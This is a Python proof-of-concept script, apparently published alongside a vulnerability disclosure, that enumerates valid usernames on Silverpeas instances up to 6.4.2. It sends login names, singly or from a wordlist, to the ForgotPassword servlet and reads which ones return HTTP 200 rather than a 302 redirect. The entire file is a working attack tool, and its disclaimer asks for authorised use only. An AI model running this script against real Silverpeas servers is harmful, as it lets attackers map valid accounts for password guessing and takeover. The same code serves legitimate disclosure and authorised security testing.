import requests
import argparse
import sys
from urllib.parse import urljoin

__author__ = "Shantanu Saxena (@https://github.com/J0ey17)"

ENDPOINT = "/silverpeas/CredentialsServlet/ForgotPassword"
STATIC_DATA = {
    "Password": "",
    "DomainId": "0"
}
VALID_STATUS_CODE = 200
INVALID_STATUS_CODE = 302

def check_username(base_url, username, session):
    """
    Checks a single username against the target endpoint.
    Returns True if potentially valid, False if potentially invalid, None on error.
    """
    target_url = urljoin(base_url, ENDPOINT)
    post_data = STATIC_DATA.copy()
    post_data['Login'] = username

    try:
        response = session.post(
            target_url,
            data=post_data,
            verify=False, # Set to True or path to cert bundle if target uses valid HTTPS
            allow_redirects=False, # VERY IMPORTANT! Prevents following 302 redirects.
            timeout=10 # Request timeout in seconds
        )

        if response.status_code == VALID_STATUS_CODE:
            print(f"[+] Username '{username}' appears VALID (Status: {response.status_code})")
            return True
        elif response.status_code == INVALID_STATUS_CODE:
            print(f"[-] Username '{username}' appears INVALID (Status: {response.status_code})")
            return False
        else:
            print(f"[?] Username '{username}' returned unexpected status: {response.status_code}")
            return None

    except requests.exceptions.Timeout:
        print(f"[!] Timeout connecting to {target_url} for username '{username}'")
        return None
    except requests.exceptions.RequestException as e:
        print(f"[!] Error checking username '{username}': {e}")
        return None

def main():
    parser = argparse.ArgumentParser(
        description=f"PoC for Silverpeas Username Enumeration (CVE-XXXX-XXXXX - placeholder). Author: {__author__}"
    )
    parser.add_argument("target_url", help="Base URL of the Silverpeas instance (e.g., http://target.com)")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--username", help="Single username to test.")
    group.add_argument("-w", "--wordlist", help="Path to a file containing usernames (one per line).")

    args = parser.parse_args()

    print(f"[*] Target URL: {args.target_url}")
    print(f"[*] Target Endpoint: {ENDPOINT}")
    print(f"[*] Checking for differing status codes ({VALID_STATUS_CODE} vs {INVALID_STATUS_CODE})...")
    print(f"[*] Script Author: {__author__}")
    print("-" * 30)

    session = requests.Session()
    session.headers.update({'User-Agent': f'Silverpeas-Enumeration-PoC ({__author__})'})

    usernames_to_test = []
    if args.username:
        usernames_to_test.append(args.username)
    elif args.wordlist:
        try:
            with open(args.wordlist, 'r') as f:
                usernames_to_test = [line.strip() for line in f if line.strip()]
            print(f"[*] Loaded {len(usernames_to_test)} usernames from {args.wordlist}")
        except FileNotFoundError:
            print(f"[!] Error: Wordlist file not found at '{args.wordlist}'")
            sys.exit(1)
        except Exception as e:
            print(f"[!] Error reading wordlist '{args.wordlist}': {e}")
            sys.exit(1)

    if not usernames_to_test:
        print("[!] No usernames specified or loaded.")
        sys.exit(1)

    valid_found = 0
    invalid_found = 0

    for username in usernames_to_test:
        result = check_username(args.target_url.rstrip('/'), username, session)
        if result is True:
            valid_found += 1
        elif result is False:
            invalid_found += 1

    print("-" * 30)
    print("[*] Scan complete.")
    print(f"[*] Potentially VALID usernames found: {valid_found}")
    print(f"[*] Potentially INVALID usernames confirmed: {invalid_found}")

if __name__ == "__main__":
    # --- WARNING ---
    print("="*60)
    print("DISCLAIMER: This script is a Proof-of-Concept for demonstrating")
    print("a specific username enumeration vulnerability in Silverpeas <= 6.4.2.")
    print(f"Author: {__author__}")
    print("Use this script responsibly and only against systems you have")
    print("explicit authorization to test. Unauthorized use is illegal.")
    print("This vulnerability is reportedly fixed in Silverpeas versions >= 6.4.3.")
    print("="*60)
    # --- END WARNING ---
    main()
